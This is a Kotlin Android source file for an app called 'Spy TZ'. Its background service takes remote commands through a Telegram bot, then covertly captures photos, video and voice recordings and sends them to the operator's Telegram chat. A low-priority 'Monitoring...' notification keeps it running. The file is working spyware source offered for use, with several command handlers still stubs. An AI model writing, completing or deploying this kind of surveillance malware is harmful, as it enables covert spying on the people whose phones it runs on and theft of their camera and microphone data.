package com.spy.tz

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.graphics.BitmapFactory
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class NotificationService : Service() {
    companion object {
        private const val TAG = "SpyTZ_Service"
        private const val CHANNEL_ID = "SpyTZ_Channel"
        private const val NOTIFICATION_ID = 1
    }

    private lateinit var botHelper: TelegramBotHelper
    private var isRecording = false
    private var recordingType = "" // "video" or "voice"

    // Store tokens here so handleCommand can access them easily
    private var currentBotToken = ""
    private var currentChatId = ""

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createNotificationChannel()
        showNotification()
        
        botHelper = TelegramBotHelper(this)
        
        // Initialize Camera if needed immediately, or wait for command
        // Note: If you need camera preview, bind lifecycle here
        
        return START_STICKY
    }

    /**
     * Call this from your Bot Handler when a command is received
     */
    fun handleCommand(command: String, botToken: String, chatId: String) {
        // Save tokens for later use in async callbacks
        currentBotToken = botToken
        currentChatId = chatId

        when {
            command.startsWith("/callme") -> {
                // Implement call logic here
                Log.d(TAG, "Call command received")
            }
            
            command.startsWith("/alarm") -> {
                // Implement alarm logic here
                Log.d(TAG, "Alarm command received")
            }
            
            command.startsWith("/status") -> {
                // Send status update
                Log.d(TAG, "Status command received")
            }

            command.startsWith("/photo") -> {
                // FIXED: Pass all 3 arguments correctly
                // Check if user specified 'back' or 'front'
                val isBack = command.contains("back")
                botHelper.switchCamera(isBack)
                
                botHelper.takePhoto(botToken, chatId) { success ->
                    if (success) {
                        Log.d(TAG, "Photo sent successfully")
                    } else {
                        Log.e(TAG, "Failed to take photo")
                    }
                }
            }

            command.startsWith("/record") -> {
                if (!isRecording) {
                    // FIXED: No extra arguments needed for startRecording()
                    botHelper.startRecording()
                    isRecording = true
                    recordingType = "video"
                }
            }

            command.startsWith("/stop") || command.startsWith("/stop record") -> {
                if (isRecording && recordingType == "video") {
                    val file = botHelper.stopRecording()
                    if (file != null) {
                        botHelper.sendVideoToBot(currentBotToken, currentChatId, file.absolutePath)
                    }
                    isRecording = false
                    recordingType = ""
                }
            }

            command.startsWith("/voice") -> {
                if (!isRecording) {
                    botHelper.startVoiceRecording()
                    isRecording = true
                    recordingType = "voice"
                }
            }

            command.startsWith("/stop voice") || command.startsWith("/stopvoice") -> {
                if (isRecording && recordingType == "voice") {
                    val file = botHelper.stopVoiceRecording()
                    if (file != null) {
                        botHelper.sendVoiceToBot(currentBotToken, currentChatId, file.absolutePath)
                    }
                    isRecording = false
                    recordingType = ""
                }
            }
        }
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(CHANNEL_ID, "Spy TZ Service", NotificationManager.IMPORTANCE_LOW).apply {
            description = "Background monitoring"
        }
        val notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.createNotificationChannel(channel)
    }

    private fun showNotification() {
        val intent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
        }
        val pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE)

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle("Spy TZ Active")
            .setContentText("Monitoring...")
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setContentIntent(pendingIntent)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }
}
